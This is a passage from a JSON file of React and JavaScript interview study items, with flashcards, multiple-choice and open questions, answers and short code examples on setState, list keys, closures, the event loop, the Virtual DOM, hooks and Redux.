              "code": "class MyCounter extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { count: 0 };\n    this.handleClick = this.handleClick.bind(this);\n    this.handleAsyncClick = this.handleAsyncClick.bind(this);\n  }\n\n  handleClick() {\n    // Async nature: console.log might show old state if batched\n    this.setState({ count: this.state.count + 1 });\n    console.log('After setState (potentially stale):', this.state.count); \n    // ^ This will often log the value *before* the update\n\n    // Using callback to ensure code runs after update\n    this.setState({ count: this.state.count + 1 }, () => {\n      console.log('After setState (callback ensures updated):', this.state.count);\n    });\n\n    // Functional setState: recommended for updates depending on previous state\n    this.setState(prevState => ({\n      count: prevState.count + 1\n    }));\n  }\n\n  // Example where functional setState is critical\n  handleAsyncClick() {\n    // These two calls are likely batched, but functional form ensures correct increments\n    setTimeout(() => {\n      this.setState(prevState => ({ count: prevState.count + 1 }));\n      this.setState(prevState => ({ count: prevState.count + 1 }));\n      console.log('Async update complete:', this.state.count); // This will log the final batched value\n    }, 0);\n  }\n\n  render() {\n    return (\n      <div>\n        <p>Count: {this.state.count}</p>\n        <button onClick={this.handleClick}>Increment Sync</button>\n        <button onClick={this.handleAsyncClick}>Increment Async</button>\n      </div>\n    );\n  }\n}",
              "explanation": "This example demonstrates two key aspects of `setState()` in class components: its asynchronous nature and the importance of the functional update form. When `handleClick` is called, the first `console.log` often shows the outdated `count` because `setState` is asynchronous and potentially batched. The callback form (`setState(updater, callback)`) guarantees execution after the state update. The functional form (`setState(updaterFunction)`) is vital when the new state depends on the previous state, preventing race conditions, especially with batched updates or multiple rapid calls, as shown in `handleAsyncClick`.",
              "language": "javascript"
            }
          ],
          "relatedQuestions": [
            "question_react_virtual_dom_explanation",
            "question_react_state_vs_props",
            "question_react_hooks_definition",
            "question_react_diffing_algorithm",
            "question_react_redux_definition_when_to_use",
            "question_react_setstate_async",
            "question_react_vdom_performance_benefits",
            "question_react_hooks_types_flashcard",
            "question_react_setstate_functional_use_case_code",
            "question_react_redux_principles_open"
          ],
          "relatedTasks": [
            "task_react_simple_counter_with_props_state",
            "task_react_class_to_functional_component",
            "task_react_manage_async_state_update"
          ],
          "tags": [
            "React",
            "Virtual DOM",
            "State",
            "Props",
            "Hooks",
            "Reconciliation",
            "Redux",
            "setState",
            "Asynchronous"
          ],
          "technology": "React",
          "prerequisites": [
            "JavaScript_Fundamentals",
            "HTML_CSS_Basics"
          ],
          "complexity": 8,
          "interviewRelevance": 10,
          "learningPath": "intermediate",
          "requiredFor": [
            "React_Development",
            "State_Management",
            "Performance_Optimization"
          ]
        }
      ],
      "questions": [
        {
          "id": "question_react_key_purpose",
          "topic": "React Keys",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the primary purpose of the `key` prop in React lists?",
          "answer": "The `key` prop helps React identify which items have changed, are added, or are removed in a list, allowing it to efficiently update the UI during reconciliation.",
          "analysisPoints": [
            "Identifies unique items in a list.",
            "Helps React's reconciliation algorithm.",
            "Crucial for efficient UI updates."
          ],
          "keyConcepts": [
            "React Keys",
            "Reconciliation",
            "List Rendering"
          ],
          "evaluationCriteria": [
            "Basic understanding of React rendering.",
            "Knowledge of key prop importance."
          ],
          "example": "",
          "tags": [
            "React",
            "Keys",
            "Lists",
            "Basics"
          ],
          "prerequisites": [
            "React_Components"
          ],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_react_key_index_issue",
          "topic": "React Keys",
          "level": "medium",
          "type": "mcq",
          "question": "Which of the following is NOT a problem associated with using an array `index` as a `key` prop in React when list items can be reordered or removed?",
          "answer": "It causes the component to render slower than without keys.",
          "options": [
            "Component state may get mixed up if list order changes.",
            "It can cause unnecessary re-renders and performance issues.",
            "It may create subtle UI bugs that are difficult to track.",
            "It causes the component to render slower than without keys."
          ],
          "analysisPoints": [
            "Incorrect keys primarily cause state corruption and incorrect rendering, not necessarily slower initial rendering than no keys at all.",
            "Using `index` as a key can *lead* to unnecessary re-renders and performance issues due to inefficient diffing, but the option implies it makes rendering inherently slower than if no keys were used, which isn't the direct problem.",
            "Keys are for *reconciliation efficiency*, not initial render speed.",
            "State mix-up, unnecessary re-renders, and subtle bugs are direct consequences of incorrect keys."
          ],
          "keyConcepts": [
            "React Keys",
            "Reconciliation",
            "Performance",
            "State Management"
          ],
          "evaluationCriteria": [
            "Understanding of key prop pitfalls.",
            "Ability to distinguish true consequences from misleading statements."
          ],
          "example": "The problem with `index` as a key is not that it's inherently slower than no key (React still uses them internally if not provided, but less effectively), but that it breaks the identity mapping React needs for correct updates when the list changes. The performance hit comes from React re-rendering more components than necessary.",
          "tags": [
            "React",
            "Keys",
            "Lists",
            "Performance",
            "Bugs"
          ],
          "prerequisites": [
            "React_Keys"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_react_key_best_practice_mcq",
          "topic": "React Keys",
          "level": "easy",
          "type": "mcq",
          "question": "Given the following array of `users`, which is the best way to render a list of `UserListItem` components in React?",
          "answer": "{users.map(user => (<UserListItem key={user.id} user={user} />))}",
          "options": [
            "{users.map((user, index) => (<UserListItem key={index} user={user} />))}",
            "{users.map(user => (<UserListItem key={user.id} user={user} />))}",
            "{users.map(user => (<UserListItem user={user} />))}",
            "{users.map((user, index) => (<UserListItem key={user.name + index} user={user} />))}"
          ],
          "analysisPoints": [
            "Option 1 uses `index` which is bad if list items change order.",
            "Option 3 provides no key, which is also problematic for performance and correctness.",
            "Option 4 creates a composite key which might not be globally unique and stable if names can be duplicated or change.",
            "Option 2 uses a stable, unique ID (`user.id`), which is the best practice for React keys."
          ],
          "keyConcepts": [
            "React Keys",
            "List Rendering",
            "Best Practices"
          ],
          "evaluationCriteria": [
            "Understanding of correct key usage.",
            "Ability to identify optimal solutions."
          ],
          "example": "```javascript\nconst users = [\n  { id: 'a1', name: 'Alice' },\n  { id: 'b2', name: 'Bob' },\n  { id: 'c3', name: 'Charlie' }\n];\n\n// Correct:\n// {users.map(user => (<UserListItem key={user.id} user={user} />))}\n// This uses a unique and stable identifier for each list item.\n```",
          "tags": [
            "React",
            "Keys",
            "Best Practices",
            "MCQ"
          ],
          "prerequisites": [
            "React_Components",
            "React_Keys"
          ],
          "complexity": 4,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_react_key_consequences_open",
          "topic": "React Keys",
          "level": "hard",
          "type": "open",
          "question": "You have a React component that renders a list of items, each with a delete button. If you use the array index as the `key` prop, describe in detail the specific issues that might arise when an item is deleted from the middle of the list. How would using a stable unique ID prevent these issues?",
          "answer": "When an item is deleted from the middle of a list where array index is used as `key`, React's diffing algorithm can get confused. If, for example, you have items A, B, C with keys 0, 1, 2, and you delete B (index 1), the new list becomes A, C. The new item C now occupies index 1. React, seeing that key `1` still exists but its props have changed from B to C, will try to *update* the component previously at index 1 (which was B) to now represent C, instead of correctly removing B and simply shifting C.\n\nSpecific issues:\n1.  **State Corruption:** If `ListItem` components have internal state (e.g., an input field, a toggle button), the state of the old item at index 2 (C) might be lost, or worse, the component at index 1 (B's old spot) might retain B's internal state but render C's data. This leads to visual discrepancies and incorrect behavior.\n2.  **Performance Degradation:** Instead of performing a simple removal of one item and shifting others efficiently, React might perform more complex updates (e.g., updating props for many components, or even remounting components) because it misidentifies the elements.\n3.  **Unpredictable Behavior/Bugs:** User interactions might affect the wrong data, or components might not render as expected, making debugging very difficult.\n\nUsing a stable unique ID (e.g., `item.id`) ensures that each component instance is uniquely identified regardless of its position. When item B with `key='b_id'` is deleted, React sees that the component with `key='b_id'` is gone and efficiently unmounts it. Item C, with its stable `key='c_id'`, will be correctly identified and, if necessary, simply shifted in the DOM without losing its state or causing other components to be incorrectly updated. This maintains component identity and ensures correct rendering and state preservation.",
          "analysisPoints": [
            "Detailed explanation of state corruption.",
            "Explanation of performance degradation due to incorrect diffing.",
            "Clarity on how unique IDs solve the problem by preserving component identity."
          ],
          "keyConcepts": [
            "React Keys",
            "Diffing Algorithm",
            "Reconciliation",
            "State Management",
            "Performance",
            "Debugging"
          ],
          "evaluationCriteria": [
            "In-depth understanding of React's reconciliation process.",
            "Ability to articulate specific consequences of anti-patterns.",
            "Knowledge of best practices and their rationale."
          ],
          "example": "",
          "tags": [
            "React",
            "Keys",
            "Best Practices",
            "Performance",
            "Bugs"
          ],
          "prerequisites": [
            "React_Keys",
            "React_State"
          ],
          "complexity": 8,
          "interviewFrequency": 7,
          "learningPath": "advanced"
        },
        {
          "id": "question_js_event_delegation_explanation",
          "topic": "JavaScript Event Delegation",
          "level": "medium",
          "type": "open",
          "question": "Explain event delegation in JavaScript and describe its benefits. Provide a simple example.",
          "answer": "Event delegation is a technique where you attach a single event listener to a parent element, instead of attaching separate listeners to each individual child element. When an event (like a click) occurs on a child, it 'bubbles up' the DOM tree. The single listener on the parent then catches the event, and by inspecting `event.target` (the element that originally triggered the event), it can determine which child was clicked and execute the appropriate logic.\n\n**Benefits:**\n1.  **Performance/Memory Efficiency:** Reduces the number of event listeners in the DOM, especially beneficial for large lists or tables. Each listener consumes memory and processing power.\n2.  **Handles Dynamic Elements:** Automatically works for elements added to the DOM *after* the page has loaded, without needing to attach new listeners to them explicitly.\n3.  **Simpler Code:** Centralizes event handling logic, making the code cleaner and easier to maintain.\n\n```javascript\n// HTML:\n// <ul id=\"parent-list\">\n//   <li>Item 1</li>\n//   <li>Item 2</li>\n// </ul>\n\nconst parentList = document.getElementById('parent-list');\n\nparentList.addEventListener('click', function(event) {\n  // Check if the clicked element is an <li>\n  if (event.target.tagName === 'LI') {\n    console.log(`Item clicked: ${event.target.textContent}`);\n    event.target.style.backgroundColor = 'lightblue';\n  }\n});\n\n// Add a new item dynamically - it will also be handled by the single listener\nconst newItem = document.createElement('li');\nnewItem.textContent = 'Item 3 (new)';\nparentList.appendChild(newItem);\n```",
          "analysisPoints": [
            "Clear definition of event delegation.",
            "Explanation of event bubbling mechanism.",
            "Identification of key benefits (performance, dynamic elements).",
            "Correct and runnable code example."
          ],
          "keyConcepts": [
            "Event Delegation",
            "Event Bubbling",
            "DOM Events",
            "Performance"
          ],
          "evaluationCriteria": [
            "Thorough understanding of the concept.",
            "Ability to provide a practical example.",
            "Knowledge of its advantages."
          ],
          "example": "```javascript\n// See answer for example code.\n```",
          "tags": [
            "JavaScript",
            "DOM",
            "Events",
            "Performance",
            "Event Delegation"
          ],
          "prerequisites": [
            "JavaScript_Basics",
            "DOM_Manipulation"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_js_double_triple_equals_mcq",
          "topic": "JavaScript Equality Operators",
          "level": "easy",
          "type": "mcq",
          "question": "What is the output of the following JavaScript code snippet?\n```javascript\nconsole.log(1 == '1');\nconsole.log(1 === '1');\n```",
          "answer": "true\nfalse",
          "options": [
            "true\ntrue",
            "false\nfalse",
            "true\nfalse",
            "false\ntrue"
          ],
          "analysisPoints": [
            "`==` (loose equality) performs type coercion, converting the string '1' to a number 1 before comparison, resulting in `true`.",
            "`===` (strict equality) compares both value and type without coercion. A number and a string are different types, resulting in `false`."
          ],
          "keyConcepts": [
            "Equality Operators",
            "Type Coercion",
            "JavaScript Types"
          ],
          "evaluationCriteria": [
            "Understanding of `==` vs `===`.",
            "Knowledge of JavaScript's type coercion rules."
          ],
          "example": "```javascript\nconsole.log(1 == '1');  // true (string '1' becomes number 1)\nconsole.log(1 === '1'); // false (number vs string)\n```",
          "tags": [
            "JavaScript",
            "Equality",
            "Operators",
            "MCQ"
          ],
          "prerequisites": [
            "JavaScript_Basics"
          ],
          "complexity": 4,
          "interviewFrequency": 9,
          "learningPath": "beginner"
        },
        {
          "id": "question_js_closure_definition",
          "topic": "JavaScript Closures",
          "level": "medium",
          "type": "flashcard",
          "question": "Define what a closure is in JavaScript.",
          "answer": "A closure is a function that has access to its outer function's scope, even after the outer function has returned. It 'remembers' the environment in which it was created.",
          "analysisPoints": [
            "Access to outer scope.",
            "Persistence after outer function returns.",
            "Lexical environment."
          ],
          "keyConcepts": [
            "Closures",
            "Scope",
            "Lexical Environment"
          ],
          "evaluationCriteria": [
            "Ability to define core concept.",
            "Understanding of scope persistence."
          ],
          "example": "",
          "tags": [
            "JavaScript",
            "Closures",
            "Scope",
            "Functions"
          ],
          "prerequisites": [
            "JavaScript_Functions",
            "Scope"
          ],
          "complexity": 5,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_js_closure_use_case_code",
          "topic": "JavaScript Closures",
          "level": "hard",
          "type": "code",
          "question": "Implement a function `createIdGenerator` that uses a closure to generate unique sequential IDs. The function should take an optional `startFrom` argument (defaulting to 1), and return an inner function. Each call to the inner function should return the next sequential ID. Demonstrate its usage.",
          "answer": "```javascript\nfunction createIdGenerator(startFrom = 1) {\n  let currentId = startFrom; // This variable is 'closed over'\n\n  return function() {\n    return currentId++; // Increments and returns the current ID, then increments for next call\n  };\n}\n\n// Demonstrating usage:\nconst generateDefaultId = createIdGenerator();\nconsole.log(generateDefaultId()); // Output: 1\nconsole.log(generateDefaultId()); // Output: 2\n\nconst generateUserId = createIdGenerator(100);\nconsole.log(generateUserId()); // Output: 100\nconsole.log(generateUserId()); // Output: 101\n\n// Independent generators\nconsole.log(generateDefaultId()); // Output: 3\n```",
          "analysisPoints": [
            "Correct use of `let` to maintain state.",
            "Inner function correctly accesses and modifies `currentId` from outer scope.",
            "Demonstrates independent instances of the closure.",
            "Handles default parameter."
          ],
          "keyConcepts": [
            "Closures",
            "Functions",
            "Scope",
            "State Management"
          ],
          "evaluationCriteria": [
            "Ability to apply closure concept.",
            "Correct implementation of stateful function.",
            "Understanding of independent closure instances."
          ],
          "example": "```javascript\n// See answer for example code.\n```",
          "tags": [
            "JavaScript",
            "Closures",
            "Code Challenge",
            "Functions"
          ],
          "prerequisites": [
            "JavaScript_Functions",
            "Scope"
          ],
          "complexity": 7,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_js_prototype_inheritance_open",
          "topic": "JavaScript Prototype Inheritance",
          "level": "medium",
          "type": "open",
          "question": "What is prototype inheritance in JavaScript? How does an object find a property or method that is not directly on itself?",
          "answer": "Prototype inheritance is the mechanism in JavaScript where objects can inherit properties and methods from other objects. Instead of traditional class-based inheritance, JavaScript uses prototypes. Every JavaScript object has an internal `[[Prototype]]` (or `__proto__`) property that links it to another object, its prototype.\n\nWhen you try to access a property or method on an object, JavaScript follows a specific lookup process:\n1.  It first checks if the property/method exists directly on the object itself.\n2.  If not found, it then looks for the property/method on the object's `[[Prototype]]` (the object it inherits from).\n3.  If still not found, it continues up the `prototype chain`, recursively checking the prototype's prototype, and so on.\n4.  This process continues until the property/method is found, or until it reaches the end of the prototype chain (which is `null`), at which point `undefined` is returned.\n\nThis chain allows objects to share properties and methods, promoting memory efficiency and inheritance.",
          "analysisPoints": [
            "Clear definition of prototype inheritance.",
            "Accurate description of the property lookup process.",
            "Mention of `[[Prototype]]` or `__proto__` and prototype chain.",
            "Understanding of the end of the chain."
          ],
          "keyConcepts": [
            "Prototype Inheritance",
            "Prototype Chain",
            "Objects",
            "JavaScript"
          ],
          "evaluationCriteria": [
            "Understanding of JavaScript's inheritance model.",
            "Ability to explain property lookup.",
            "Knowledge of core prototype concepts."
          ],
          "example": "",
          "tags": [
            "JavaScript",
            "Prototypes",
            "Inheritance",
            "Objects"
          ],
          "prerequisites": [
            "JavaScript_Objects"
          ],
          "complexity": 6,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_js_event_loop_flow",
          "topic": "JavaScript Event Loop",
          "level": "hard",
          "type": "open",
          "question": "Describe the main components of the JavaScript Event Loop and explain how it allows JavaScript to perform non-blocking operations despite being single-threaded. Illustrate the execution order with a conceptual example involving `setTimeout` and `Promise.resolve`.",
          "answer": "The JavaScript Event Loop is a crucial concurrency model that enables JavaScript to handle asynchronous operations without blocking the single execution thread. Its main components are:\n\n1.  **Call Stack:** This is where synchronous JavaScript code is executed. Functions are pushed onto the stack when invoked and popped off when they return. It's strictly LIFO (Last-In, First-Out).\n2.  **Web APIs / Node.js APIs:** These are environments (like browser APIs for `setTimeout`, `fetch`, DOM events, or Node.js APIs for file I/O) that handle asynchronous tasks. When JavaScript encounters an async operation, it offloads it to the respective Web API.\n3.  **Callback Queue (or Macrotask Queue):** After a Web API completes an asynchronous task (e.g., `setTimeout` delay expires, `fetch` response is ready, a DOM event fires), its associated callback function is moved to this queue.\n4.  **Microtask Queue:** This is a higher-priority queue than the Callback Queue. It holds callbacks for Promises (`.then()`, `.catch()`, `.finally()`) and `queueMicrotask`.\n5.  **Event Loop:** This is a continuous process that constantly monitors the Call Stack. When the Call Stack is empty, the Event Loop first checks the Microtask Queue. It dequeues and executes *all* microtasks until the Microtask Queue is empty. After that, it checks the Callback Queue. If it's not empty, it takes the first callback from the Callback Queue and pushes it onto the Call Stack for execution. This cycle repeats.\n\nThis mechanism allows JavaScript to be non-blocking: synchronous code runs first, then asynchronous tasks are offloaded, and their callbacks are queued. The Event Loop ensures these callbacks are executed *only* when the Call Stack is free, preventing blocking behavior.\n\n**Conceptual Example Execution Order:**\n```javascript\nconsole.log('Synchronous 1');\n\nsetTimeout(() => {\n  console.log('Macrotask (setTimeout)');\n}, 0);\n\nPromise.resolve().then(() => {\n  console.log('Microtask (Promise)');\n});\n\nconsole.log('Synchronous 2');\n\n// Execution Flow:\n// 1. 'Synchronous 1' is logged (Call Stack).\n// 2. setTimeout callback is sent to Web API, then moved to Callback Queue after 0ms.\n// 3. Promise.resolve().then() callback is sent to Microtask Queue.\n// 4. 'Synchronous 2' is logged (Call Stack).\n// 5. Call Stack is now empty.\n// 6. Event Loop checks Microtask Queue: Moves 'Microtask (Promise)' callback to Call Stack.\n// 7. 'Microtask (Promise)' is logged (Call Stack).\n// 8. Call Stack empty again.\n// 9. Event Loop checks Microtask Queue (empty).\n// 10. Event Loop checks Callback Queue: Moves 'Macrotask (setTimeout)' callback to Call Stack.\n// 11. 'Macrotask (setTimeout)' is logged (Call Stack).\n\n// Final Output Order:\n// Synchronous 1\n// Synchronous 2\n// Microtask (Promise)\n// Macrotask (setTimeout)\n```",
          "analysisPoints": [
            "Comprehensive description of Call Stack, Web APIs, Callback Queue, Microtask Queue, and Event Loop.",
            "Clear explanation of single-threaded non-blocking behavior.",
            "Accurate illustration of execution order with `setTimeout` and `Promise.resolve` demonstrating microtask priority."
          ],
          "keyConcepts": [
            "Event Loop",
            "Asynchronous JavaScript",
            "Call Stack",
            "Task Queue",
            "Microtask Queue",
            "Web APIs",
            "Single-threaded"
          ],
          "evaluationCriteria": [
            "Deep understanding of JS runtime environment.",
            "Ability to explain complex asynchronous concepts.",
            "Correctly illustrates priority of queues."
          ],
          "example": "```javascript\n// See answer for example code.\n```",
          "tags": [
            "JavaScript",
            "Event Loop",
            "Asynchronous",
            "Concurrency"
          ],
          "prerequisites": [
            "JavaScript_Functions",
            "Promises",
            "setTimeout"
          ],
          "complexity": 9,
          "interviewFrequency": 9,
          "learningPath": "advanced"
        },
        {
          "id": "question_js_event_loop_mcq",
          "topic": "JavaScript Event Loop",
          "level": "medium",
          "type": "mcq",
          "question": "Consider the following JavaScript code:\n```javascript\nconsole.log('A');\n\nsetTimeout(() => {\n  console.log('B');\n}, 0);\n\nPromise.resolve().then(() => {\n  console.log('C');\n});\n\nconsole.log('D');\n```\nWhat will be the exact order of console outputs?",
          "answer": "A, D, C, B",
          "options": [
            "A, B, C, D",
            "A, D, B, C",
            "A, C, B, D",
            "A, D, C, B"
          ],
          "analysisPoints": [
            "Synchronous code runs first: 'A' then 'D'.",
            "Promises (microtasks) have higher priority than `setTimeout` (macrotasks).",
            "So, 'C' (from Promise) executes before 'B' (from setTimeout), even with 0ms delay."
          ],
          "keyConcepts": [
            "Event Loop",
            "Microtasks",
            "Macrotasks",
            "Execution Order",
            "Promises",
            "setTimeout"
          ],
          "evaluationCriteria": [
            "Correct understanding of event loop queue priorities.",
            "Ability to trace execution flow."
          ],
          "example": "```javascript\n// The outputs will be:\n// A\n// D\n// C\n// B\n// Because synchronous code runs first, then microtasks (Promises), then macrotasks (setTimeout).\n```",
          "tags": [
            "JavaScript",
            "Event Loop",
            "Asynchronous",
            "MCQ"
          ],
          "prerequisites": [
            "Promises",
            "setTimeout"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_react_virtual_dom_explanation",
          "topic": "React Virtual DOM",
          "level": "medium",
          "type": "open",
          "question": "What is the Virtual DOM in React and why is it used?",
          "answer": "The Virtual DOM (VDOM) is a lightweight, in-memory representation of the actual DOM. It's a JavaScript object that mimics the structure of the browser's DOM tree. React uses it as an abstraction layer for rendering the UI.\n\n**Why it's used:**\nDirectly manipulating the actual DOM is a very expensive operation in terms of performance. Each time the DOM is modified, the browser has to re-calculate styles, layout, and repaint, which can be slow and lead to janky UIs, especially for complex applications with frequent updates.\n\nReact uses the Virtual DOM to optimize this process:\n1.  When a component's state or props change, React first re-renders its Virtual DOM representation.\n2.  It then compares this new Virtual DOM with the previous one (a process called 'diffing').\n3.  Based on the diff, React calculates the minimal set of changes (additions, deletions, updates) required.\n4.  Finally, React applies only these necessary changes to the actual DOM. This process is called 'Reconciliation'.\n\nThis approach minimizes direct DOM manipulations, leading to significant performance improvements and a smoother user experience, as React can batch updates and avoid unnecessary re-renders.",
          "analysisPoints": [
            "Clear definition of Virtual DOM.",
            "Explanation of its purpose (performance optimization).",
            "Description of diffing and reconciliation process.",
            "Understanding of the cost of direct DOM manipulation."
          ],
          "keyConcepts": [
            "Virtual DOM",
            "Reconciliation",
            "Diffing",
            "Performance Optimization",
            "React"
          ],
          "evaluationCriteria": [
            "Thorough understanding of VDOM mechanics.",
            "Ability to explain performance benefits.",
            "Knowledge of reconciliation process."
          ],
          "example": "",
          "tags": [
            "React",
            "Virtual DOM",
            "Performance",
            "Interview"
          ],
          "prerequisites": [
            "React_Components",
            "DOM_Basics"
          ],
          "complexity": 7,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_react_vdom_performance_benefits",
          "topic": "React Virtual DOM",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the primary performance benefit of using the Virtual DOM in React?",
          "answer": "The primary benefit is minimizing direct manipulations of the actual DOM, which is a slow operation. React calculates the minimal changes needed and applies them efficiently.",
          "analysisPoints": [
            "Focus on DOM manipulation cost.",
            "Efficiency through minimal updates."
          ],
          "keyConcepts": [
            "Virtual DOM",
            "Performance",
            "DOM Manipulation"
          ],
          "evaluationCriteria": [
            "Quick recall of VDOM's main advantage."
          ],
          "example": "",
          "tags": [
            "React",
            "Virtual DOM",
            "Performance",
            "Flashcard"
          ],
          "prerequisites": [
            "Virtual_DOM"
          ],
          "complexity": 3,
          "interviewFrequency": 8,
          "learningPath": "beginner"
        },
        {
          "id": "question_react_state_vs_props",
          "topic": "React State & Props",
          "level": "medium",
          "type": "mcq",
          "question": "Which statement accurately describes the difference between `state` and `props` in React?",
          "answer": "Props are passed from parent to child and are immutable within the child; state is managed internally by a component and can be changed by the component itself.",
          "options": [
            "State is used for passing data down to child components, while props are for internal component data.",
            "Props can be modified by the component that receives them, whereas state is immutable.",
            "Props are passed from parent to child and are immutable within the child; state is managed internally by a component and can be changed by the component itself.",
            "Both state and props are managed internally by a component and can be changed over time."
          ],
          "analysisPoints": [
            "Option 1 incorrectly defines their usage.",
            "Option 2 incorrectly states mutability.",
            "Option 4 incorrectly states both are internal and mutable.",
            "Option 3 correctly identifies props as immutable and external/passed, and state as mutable and internal/managed."
          ],
          "keyConcepts": [
            "React State",
            "React Props",
            "Data Flow",
            "Immutability"
          ],
          "evaluationCriteria": [
            "Clear understanding of `state` vs. `props` definitions.",
            "Knowledge of data flow and mutability rules."
          ],
          "example": "```javascript\n// ParentComponent passing props and managing state:\nfunction ParentComponent() {\n  const [count, setCount] = React.useState(0);\n  return <ChildComponent value={count} onIncrement={() => setCount(count + 1)} />;\n}\n\n// ChildComponent receiving props (value, onIncrement) and cannot change them:\nfunction ChildComponent(props) {\n  // props.value = 5; // ERROR: Cannot modify props\n  return (\n    <div>\n      <p>Received prop: {props.value}</p>\n      <button onClick={props.onIncrement}>Increment from Child</button>\n    </div>\n  );\n}\n```",
          "tags": [
            "React",
            "State",
            "Props",
            "MCQ",
            "Fundamentals"
          ],
          "prerequisites": [
            "React_Components"
          ],
          "complexity": 5,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_react_hooks_definition",
          "topic": "React Hooks",
          "level": "easy",
          "type": "flashcard",
          "question": "What are React Hooks?",
          "answer": "React Hooks are functions that let you 'hook into' React state and lifecycle features from functional components. They were introduced to allow functional components to have state and side effects without writing class components.",
          "analysisPoints": [
            "Functions for state/lifecycle in functional components.",
            "Alternative to class components for these features."
          ],
          "keyConcepts": [
            "React Hooks",
            "Functional Components",
            "State",
            "Lifecycle"
          ],
          "evaluationCriteria": [
            "Basic definition of Hooks."
          ],
          "example": "",
          "tags": [
            "React",
            "Hooks",
            "Functional Components",
            "Flashcard"
          ],
          "prerequisites": [
            "React_Components"
          ],
          "complexity": 3,
          "interviewFrequency": 8,
          "learningPath": "beginner"
        },
        {
          "id": "question_react_hooks_types_flashcard",
          "topic": "React Hooks",
          "level": "medium",
          "type": "flashcard",
          "question": "Name at least three common React Hooks and briefly describe their purpose.",
          "answer": "- `useState`: Adds state to functional components.\n- `useEffect`: Performs side effects (e.g., data fetching, subscriptions) after render.\n- `useContext`: Subscribes to React context.\n- `useReducer`: Alternative to `useState` for complex state logic.\n- `useMemo`: Memoizes (caches) expensive computations.\n- `useCallback`: Memoizes callback functions.",
          "analysisPoints": [
            "Recall common hooks.",
            "Briefly state their primary function."
          ],
          "keyConcepts": [
            "React Hooks",
            "useState",
            "useEffect",
            "useContext",
            "useReducer",
            "useMemo",
            "useCallback"
          ],
          "evaluationCriteria": [
            "Knowledge of commonly used Hooks.",
            "Ability to explain their basic use cases."
          ],
          "example": "",
          "tags": [
            "React",
            "Hooks",
            "Functional Components",
            "Flashcard"
          ],
          "prerequisites": [
            "React_Hooks"
          ],
          "complexity": 5,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_react_diffing_algorithm",
          "topic": "React Diffing Algorithm",
          "level": "medium",
          "type": "open",
          "question": "Explain React's diffing algorithm and its primary heuristics.",
          "answer": "React's diffing algorithm is a part of the reconciliation process. It's the set of heuristics React uses to efficiently compare two virtual DOM trees (the old one and the new one after a state/prop update) to determine the minimal set of changes needed to update the actual DOM.\n\nIts primary heuristics are:\n1.  **Comparing two elements of different types:** If React sees two elements of different types at the same position (e.g., `<div>` changes to `<span>`), it will unmount the old component and destroy its subtree, then build the new tree from scratch. This is an efficient 'destroy and recreate' strategy.\n2.  **Comparing DOM elements of the same type:** If elements are of the same type (e.g., `<div>` to `<div>`), React looks at their attributes (props). It only updates the attributes that have changed on the existing actual DOM node.\n3.  **Recursing on children:** For elements with children, React processes the children. By default, it iterates over both the old and new lists of children simultaneously. If a `key` prop is provided for list items, React uses these keys to match children from the old list with children in the new list. This allows it to efficiently detect additions, removals, and reordering of list items, minimizing DOM operations.",
          "analysisPoints": [
            "Definition of diffing in context of reconciliation.",
            "Detailed explanation of heuristics for different types.",
            "Detailed explanation of heuristics for same types.",
            "Detailed explanation of how keys help with children comparison."
          ],
          "keyConcepts": [
            "React Diffing",
            "Reconciliation",
            "Virtual DOM",
            "Keys",
            "Performance"
          ],
          "evaluationCriteria": [
            "Understanding of how React optimizes DOM updates.",
            "Knowledge of the core rules of the diffing algorithm.",
            "Ability to explain key's role in diffing."
          ],
          "example": "",
          "tags": [
            "React",
            "Diffing",
            "Reconciliation",
            "Performance"
          ],
          "prerequisites": [
            "Virtual_DOM",
            "React_Keys"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "advanced"
        },
        {
          "id": "question_react_redux_definition_when_to_use",
          "topic": "Redux",
          "level": "medium",
          "type": "open",
          "question": "What is Redux and when would you typically use it in a React application?",
          "answer": "Redux is a predictable state container for JavaScript applications. It provides a centralized store for your application's state, making state changes predictable and easier to debug. It's often used with React to manage global or application-wide state.\n\n**When to use it:**\nRedux is generally considered for applications with:\n1.  **Complex State:** When the state is large, has many branches, or needs to be shared across many components, especially those not directly related (avoiding 'prop drilling').\n2.  **Frequent State Updates:** When many actions modify the state throughout the application, and you need a clear, centralized way to manage these updates.\n3.  **Predictable State Changes:** When you need strict control over how state changes occur, with clear actions and pure reducer functions, aiding in debugging and maintaining consistency.\n4.  **Large Teams/Codebases:** It provides a consistent pattern for state management, which is beneficial for collaboration on larger projects.\n\nFor simpler applications, React's built-in `useState` and `useContext` hooks are often sufficient for managing state.",
          "analysisPoints": [
            "Clear definition of Redux.",
            "Understanding of its core purpose (predictable state container).",
            "Identification of scenarios where Redux is beneficial.",
            "Contrast with simpler state management solutions."
          ],
          "keyConcepts": [
            "Redux",
            "State Management",
            "Predictable State",
            "Centralized Store",
            "Actions",
            "Reducers"
          ],
          "evaluationCriteria": [
            "Understanding of Redux's role.",
            "Ability to identify appropriate use cases for Redux.",
            "Awareness of alternatives."
          ],
          "example": "",
          "tags": [
            "React",
            "Redux",
            "State Management",
            "Architecture"
          ],
          "prerequisites": [
            "React_State_Props"
          ],
          "complexity": 7,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_react_redux_principles_open",
          "topic": "Redux",
          "level": "hard",
          "type": "open",
          "question": "Redux follows three core principles. List and briefly explain each one.",
